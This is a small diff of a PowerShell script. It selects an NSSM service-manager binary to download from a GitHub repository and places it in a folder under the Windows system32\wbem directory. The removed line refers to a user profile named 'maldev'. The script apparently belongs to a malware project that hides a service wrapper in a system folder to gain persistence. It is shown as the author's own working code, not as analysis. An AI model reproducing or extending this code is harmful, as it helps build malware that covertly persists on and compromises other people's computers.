@@ -18,7 +18,7 @@ if($arch -eq "64-bit"){
 }else{
     $nssmUrl = "https://github.com/Soumyo001/progressive_0verload/raw/refs/heads/main/assets/nssmx32.exe"
 }
-echo $basePath >> "C:\Users\maldev\Downloads\init_root_mon.txt"
+
 $nssmFolder = "$env:windir\system32\wbem\nssm"
 $nssmexe = "$nssmFolder\nssm.exe"
 $propertyName = "rootMon"
